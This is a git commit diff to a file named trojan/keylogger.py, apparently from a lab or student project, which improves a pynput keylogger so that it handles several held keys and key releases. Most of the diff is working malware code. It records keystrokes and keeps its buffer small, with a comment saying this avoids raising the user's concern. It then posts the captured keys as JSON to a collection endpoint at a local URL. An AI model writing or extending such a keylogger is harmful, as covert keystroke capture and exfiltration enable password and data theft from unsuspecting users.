310003d998f6a4d3eb2bd28bd5ab612c36a5bafb
jklypchak13 <jarod.klypchak@gmail.com>
2020-03-02 23:03:29 -0500

    Fixed keylogger to properly handler multiple character presses.

--- src/trojan/keylogger.py
+++ src/trojan/keylogger.py
@@ -6,7 +6,7 @@ from pynput.keyboard import Key, KeyCode  # type: ignore
 
 # Maximum number of keys to save, keep low to avoid memory issues
 # that could warrant concern from user
-SAVED_KEYS_LIMIT: Final[int] = 64
+SAVED_KEYS_LIMIT: Final[int] = 32
 
 
 class Keylogger:
@@ -21,7 +21,7 @@ class Keylogger:
     """
 
     _keys_pressed: List[str] = []
-    _pressed: Optional[str] = None
+    _pressed: dict = {}
 
     def log_key(self, key: Union[Key, KeyCode]):
         """
@@ -33,19 +33,42 @@ class Keylogger:
         event: Union[Key, KeyCode]
              Event to log
         """
+        character: str = None
         try:
             if self._pressed != key.char:
-                self._pressed = key.char
-                self._keys_pressed.append(key.char)
+                character = key.char
         except AttributeError:
-            if self._pressed != key.name:
-                self._pressed = key.name
-                self._keys_pressed.append(key.name)
+            character = key.name
+
+        if character in self._pressed.keys():
+            if self._pressed[character]:
+                return
+
+        self._keys_pressed.append(character)
+
+        self._pressed[character] = True
 
         if len(self._keys_pressed) >= SAVED_KEYS_LIMIT:
             url = "http://127.0.0.1:5000/keylogger/send_data"
             response: dict = requests.post(url, json=self._to_json())
             self._keys_pressed.clear()
+
+    def release_key(self, key: Union[Key, KeyCode]):
+        """
+        Logs keyboard release event
+        Paramters
+        ---------
+
+        event: Union[Key, KeyCode]
+             Event to log
+        """
+        character: str = None
+        try:
+            if self._pressed != key.char:
+                character = key.char
+        except AttributeError:
+            character = key.name
+        self._pressed[character] = False
 
     def _to_json(self) -> str:
         """
@@ -67,7 +90,7 @@ def start_logger():
     Main entry point to start Keylogger
     """
     keylogger = Keylogger()
-    with keyboard.Listener(on_press=keylogger.log_key) as listener:
+    with keyboard.Listener(on_press=keylogger.log_key, on_release=keylogger.release_key) as listener:
         listener.join()
 
 
